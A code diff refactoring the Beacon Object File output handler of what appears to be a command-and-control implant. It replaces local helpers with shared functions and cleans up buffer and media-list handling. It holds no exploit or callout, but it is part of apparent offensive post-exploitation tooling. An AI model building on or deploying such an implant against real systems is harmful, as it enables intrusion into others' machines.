@@ -18,22 +18,6 @@
 #include "Common.h"
 #include "Bof.h"
 
-static VOID BofW32( PBYTE p, UINT32 v ) {
-    p[0] = (BYTE)v; p[1] = (BYTE)( v >> 8 ); p[2] = (BYTE)( v >> 16 ); p[3] = (BYTE)( v >> 24 );
-}
-
-/* Reverse a singly-linked list (media entries are prepended; reverse for FIFO order). */
-static NAX_BOF_MEDIA* BofReverseMedia( NAX_BOF_MEDIA* head ) {
-    NAX_BOF_MEDIA* prev = NULL;
-    while ( head ) {
-        NAX_BOF_MEDIA* next = head->Next;
-        head->Next = prev;
-        prev = head;
-        head = next;
-    }
-    return prev;
-}
-
 FUNC INT NaxCmdBof( PNAX_INSTANCE Nax, UINT32 taskId, const PBYTE args, UINT32 args_len,
                     PBYTE out, UINT32* out_len ) {
     if ( args_len < 13 || args == NULL ) return NAX_ERR_INVAL;
@@ -72,10 +56,10 @@ FUNC INT NaxCmdBof( PNAX_INSTANCE Nax, UINT32 taskId, const PBYTE args, UINT32 a
     }
 
     /* ---- sync path (existing logic) ---- */
-    PBYTE out_buf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, BOF_OUTPUT_CAP );
-    if ( !out_buf ) return NAX_ERR_NOMEM;
+    PBYTE ob = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, BOF_OUTPUT_CAP );
+    if ( !ob ) return NAX_ERR_NOMEM;
 
-    Nax->BofCtx.Buf       = out_buf;
+    Nax->BofCtx.Buf       = ob;
     Nax->BofCtx.Len       = 0;
     Nax->BofCtx.Cap       = BOF_OUTPUT_CAP;
     Nax->BofCtx.MediaHead = NULL;
@@ -93,7 +77,7 @@ FUNC INT NaxCmdBof( PNAX_INSTANCE Nax, UINT32 taskId, const PBYTE args, UINT32 a
     }
 
     if ( has_media ) {
-        Nax->BofCtx.MediaHead = BofReverseMedia( Nax->BofCtx.MediaHead );
+        Nax->BofCtx.MediaHead = NaxBofReverseMedia( Nax->BofCtx.MediaHead );
 
         for ( NAX_BOF_MEDIA* m = Nax->BofCtx.MediaHead; m; m = m->Next ) {
             if ( off + m->Len <= *out_len ) {
@@ -104,29 +88,23 @@ FUNC INT NaxCmdBof( PNAX_INSTANCE Nax, UINT32 taskId, const PBYTE args, UINT32 a
 
         if ( has_text && off + 5u + Nax->BofCtx.Len <= *out_len ) {
             out[ off ] = 0x00;
-            BofW32( out + off + 1, Nax->BofCtx.Len );
-            MmCopy( out + off + 5, out_buf, Nax->BofCtx.Len );
+            NaxW32( out + off + 1, Nax->BofCtx.Len );
+            MmCopy( out + off + 5, Nax->BofCtx.Buf, Nax->BofCtx.Len );
             off += 5u + Nax->BofCtx.Len;
         }
         *out_len = off;
     } else if ( has_text ) {
         UINT32 copy = ( Nax->BofCtx.Len < *out_len - off ) ? Nax->BofCtx.Len : *out_len - off;
-        MmCopy( out + off, out_buf, copy );
+        MmCopy( out + off, Nax->BofCtx.Buf, copy );
         *out_len = off + copy;
     } else {
         *out_len = off;
     }
 
-    NAX_BOF_MEDIA* m = Nax->BofCtx.MediaHead;
-    while ( m ) {
-        NAX_BOF_MEDIA* next = m->Next;
-        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, m->Data );
-        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, m );
-        m = next;
-    }
+    NaxBofFreeMedia( Nax, Nax->BofCtx.MediaHead );
     Nax->BofCtx.MediaHead = NULL;
 
-    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, out_buf );
+    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, Nax->BofCtx.Buf );
     Nax->BofCtx.Buf = NULL;
     Nax->BofCtx.Len = 0;
     Nax->BofCtx.Cap = 0;
